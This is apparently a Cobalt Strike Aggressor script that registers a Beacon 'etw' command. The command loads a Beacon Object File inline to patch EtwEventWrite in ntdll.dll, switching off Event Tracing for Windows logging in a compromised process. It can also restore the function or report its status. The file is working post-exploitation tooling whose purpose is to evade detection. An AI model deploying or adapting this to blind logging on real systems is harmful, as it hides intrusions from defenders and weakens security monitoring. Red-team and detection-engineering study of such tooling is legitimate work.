beacon_command_register(
"etw", 
"Start or stop ETW logging.", 
"etw stop   - patch out EtwEventWrite in Ntdll.dll to prevent ETW-based logging.
etw start  - patch back in EtwEventWrite in Ntdll.dll to restart ETW-based logging.
etw status - check the status of EtwEventWrite on current process.");

alias etw {
	local('$barch $handle $data $args');

	if(size(@_) != 2)
	{
		berror($1, "Incorrect usage!");
		berror($1, beacon_command_detail("etw"));
		return;
	}

	if(($2 eq "start")||($2 eq "stop")||($2 eq "status"))
	{
		# figure out the arch of this session
		$barch  = barch($1);
		
		# read in the right BOF file
		$handle = openf(script_resource("etw. $+ $barch $+ .o"));
		$data   = readb($handle, -1);
		closef($handle);

		# pack our arguments
		$args = bof_pack($1, "z", $2);
		
		# announce what we're doing
		btask($1, "Running ETW patching BOF (@ajpc500)");
		
		# execute it.
		beacon_inline_execute($1, $data, "go", $args);
	}else{
		berror($1, "Incorrect usage!");
		berror($1, beacon_command_detail("etw"));
		return;
	}
}
